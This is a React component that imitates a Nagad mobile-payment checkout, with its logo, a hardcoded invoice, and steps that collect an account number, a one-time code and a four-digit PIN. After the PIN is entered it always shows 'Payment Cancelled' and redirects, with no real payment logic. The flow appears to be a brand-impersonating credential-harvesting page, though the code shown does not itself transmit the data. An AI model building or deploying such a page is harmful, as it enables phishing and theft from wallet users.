import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { XCircle } from "lucide-react";
import cartIcon from "@/assets/cart-icon.png";
import nagadLogoWhite from "@/assets/nagad-logo-white.png";

const NagadPayment = () => {
  const navigate = useNavigate();
  const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
  const [showOtpView, setShowOtpView] = useState(false);
  const [showPinView, setShowPinView] = useState(false);
  const [showFailedView, setShowFailedView] = useState(false);
  const [otpValue, setOtpValue] = useState("");
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [language, setLanguage] = useState<'bn' | 'en'>('en');
  const [phoneError, setPhoneError] = useState("");

  const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRef = useRef<HTMLInputElement | null>(null);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (!showFailedView) {
      setTimeout(() => {
        if (showPinView) pinInputRefs.current[0]?.focus();
        else if (showOtpView) otpInputRef.current?.focus();
        else phoneInputRefs.current[0]?.focus();
      }, 100);
    }
  }, [showOtpView, showPinView, showFailedView]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const getPhoneNumber = () => phoneDigits.join("");
  const isValidNumber = () => {
    const phone = getPhoneNumber();
    return phone.length === 11 && validPrefixes.includes(phone.substring(0, 3)) && /^\d+$/.test(phone);
  };
  const isValidOtp = () => otpValue.length === 6 && /^\d+$/.test(otpValue);
  const isValidPin = () => pinDigits.every(d => d !== "") && pinDigits.join("").length === 4;

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showFailedView && redirectTimer > 0) {
      interval = setInterval(() => setRedirectTimer((prev) => prev - 1), 1000);
    }
    if (showFailedView && redirectTimer === 0) navigate("/");
    return () => clearInterval(interval);
  }, [showFailedView, redirectTimer, navigate]);

  const handleDigitChange = (
    index: number, value: string, digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>, maxLength: number
  ) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (value && index < maxLength - 1) refs.current[index + 1]?.focus();
  };

  const handleKeyDown = (
    index: number, e: React.KeyboardEvent<HTMLInputElement>,
    digits: string[], setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) refs.current[index - 1]?.focus();
  };

  const handleConfirm = () => {
    if (isValidNumber()) { setPhoneError(""); setShowOtpView(true); }
    else setPhoneError("Invalid mobile number");
  };
  const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); } };
  const handlePinConfirm = () => { if (isValidPin()) { setShowPinView(false); setShowFailedView(true); setRedirectTimer(5); } };
  const handleClose = () => navigate("/");

  const renderPhoneInputs = () => {
    const groups = [3, 4, 4];
    let currentIndex = 0;
    const elements: JSX.Element[] = [];
    groups.forEach((groupSize, groupIndex) => {
      const inputs: JSX.Element[] = [];
      for (let i = 0; i < groupSize; i++) {
        const idx = currentIndex + i;
        inputs.push(
          <input key={idx} ref={(el) => (phoneInputRefs.current[idx] = el)}
            type="tel" inputMode="numeric" maxLength={1} value={phoneDigits[idx] || ""}
            onChange={(e) => handleDigitChange(idx, e.target.value, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
            onKeyDown={(e) => handleKeyDown(idx, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
            className="w-7 h-8 bg-white rounded text-center text-gray-800 text-xs font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
          />
        );
      }
      elements.push(<div key={groupIndex} className="flex gap-0.5">{inputs}</div>);
      currentIndex += groupSize;
      if (groupIndex < groups.length - 1) {
        elements.push(<span key={`sep-${groupIndex}`} className="text-white text-base font-bold mx-0.5">-</span>);
      }
    });
    return <div className="flex items-center justify-center">{elements}</div>;
  };

  const renderPinInputs = () => (
    <div className="flex items-center justify-center gap-2">
      {pinDigits.map((digit, index) => (
        <input key={index} ref={(el) => (pinInputRefs.current[index] = el)}
          type="password" inputMode="numeric" maxLength={1} value={digit}
          onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
          onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
          className="w-11 h-11 bg-white rounded-md text-center text-gray-800 text-xl font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
        />
      ))}
    </div>
  );

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-300 p-0">
      <div className="w-full h-screen flex flex-col overflow-hidden border-2 border-black"
        style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
      {showFailedView ? (
        <div className="flex-1 flex flex-col items-center justify-center">
          <XCircle className="w-12 h-12 text-white mb-4" strokeWidth={1.5} />
          <h3 className="text-white text-center text-lg font-medium mb-2">Payment Cancelled</h3>
          <p className="text-white text-center text-sm">Redirecting to Merchant Website in {redirectTimer}s</p>
        </div>
      ) : (
        <div className="flex-1 flex flex-col">
          {/* Language Toggle */}
          <div className="flex justify-end p-2">
            <div className="flex rounded overflow-hidden border border-white/40">
              <button onClick={() => setLanguage('bn')}
                className={`px-2 py-0.5 text-[10px] font-medium transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
              <button onClick={() => setLanguage('en')}
                className={`px-2 py-0.5 text-[10px] font-medium transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
            </div>
          </div>

          {/* Cart Icon & Title */}
          <div className="flex flex-col items-center pt-1 pb-2">
            <img src={cartIcon} alt="Cart" className="w-14 h-14 mb-1 object-contain" />
            <h1 className="text-white text-base font-semibold">Easy Payment System</h1>
          </div>

          {/* Invoice Details */}
          <div className="px-5 py-2 space-y-1">
            <div className="flex">
              <span className="text-white font-bold text-xs w-28">Invoice No:</span>
              <span className="text-white/70 text-xs">B255527202718B</span>
            </div>
            <div className="flex">
              <span className="text-white font-bold text-xs w-28">Total Amount:</span>
              <span className="text-white/70 text-xs">BDT 434</span>
            </div>
            <div className="flex">
              <span className="text-white font-bold text-xs w-28">Charge:</span>
              <span className="text-white/70 text-xs">BDT 0</span>
            </div>
          </div>

          <div className="flex-1" />

          {/* Input Section */}
          <div className="px-5 pb-2">
            {showPinView ? (
              <div className="flex flex-col items-center">
                <p className="text-white text-center text-sm font-medium mb-3">Enter PIN</p>
                {renderPinInputs()}
              </div>
            ) : showOtpView ? (
              <div className="flex flex-col items-center">
                <p className="text-white text-center text-sm font-medium mb-3">Enter Verification Code [OTP]</p>
                <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                  onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  placeholder="XXX|XXX"
                  className="w-full h-9 bg-white rounded text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
                />
              </div>
            ) : (
              <div className="flex flex-col items-center">
                <p className="text-white text-center text-sm font-semibold mb-3">Your Nagad Account Number</p>
                {renderPhoneInputs()}
                {phoneError && (
                  <p className="text-yellow-300 text-xs font-medium mt-2">{phoneError}</p>
                )}
              </div>
            )}
          </div>

          {/* Terms */}
          <div className="px-5 py-1">
            {!showOtpView && !showPinView && (
              <p className="text-white/80 text-center text-[10px] leading-tight">
                By clicking/tapping "Proceed" you are agreeing to our{" "}
                <span className="text-white font-semibold underline">Terms and Conditions</span>
              </p>
            )}
          </div>

          {/* Action Buttons */}
          <div className="px-5 py-2 flex gap-8 justify-center">
            <button
              onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
            >Proceed</button>
            {showOtpView && (
              <button onClick={() => setOtpValue("")}
                className="px-6 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
              >Resend Code</button>
            )}
            <button onClick={handleClose}
              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
            >Close</button>
          </div>

          {/* Spacer */}
          <div className="flex-1" />

          {/* White Nagad Logo Footer */}
          <div className="flex justify-center pb-4">
            <img src={nagadLogoWhite} alt="Nagad" className="h-10 object-contain" />
          </div>
        </div>
      )}
      </div>
    </div>
  );
};

export default NagadPayment;
